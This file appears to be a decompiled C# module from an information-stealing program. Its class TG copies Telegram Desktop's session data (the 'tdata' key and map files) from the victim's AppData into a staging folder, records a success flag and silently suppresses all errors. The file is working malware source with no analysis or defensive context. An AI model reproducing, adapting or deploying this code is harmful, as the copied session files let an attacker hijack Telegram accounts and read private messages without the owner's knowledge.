using System;
using System.IO;

// Token: 0x02000014 RID: 20
internal class TG
{
	// Token: 0x06000031 RID: 49 RVA: 0x0000491C File Offset: 0x00002B1C
	public static void Start()
	{
		try
		{
			string text = string.Format("{0}Telegram", global::Buffer.path_l);
			string text2 = string.Format("{0}Telegram Desktop\\tdata", global::Buffer.path_ad);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(text2))
			{
				if (!Directory.Exists(text + "\\D877F783D5D3EF8C"))
				{
					Directory.CreateDirectory(text + "\\D877F783D5D3EF8C");
				}
				foreach (string str in new string[]
				{
					"\\D877F783D5D3EF8C1",
					"\\D877F783D5D3EF8C0",
					"\\D877F783D5D3EF8C\\map1",
					"\\D877F783D5D3EF8C\\map0"
				})
				{
					try
					{
						File.Copy(text2 + str, text + str, true);
					}
					catch
					{
					}
				}
				global::Buffer.XBufferData[3] = "1";
				return;
			}
			File.WriteAllText(string.Format("{0}\\data.txt", text), string.Format("{0}", global::Buffer.head));
		}
		catch
		{
		}
		global::Buffer.XBufferData[3] = "0";
	}
}
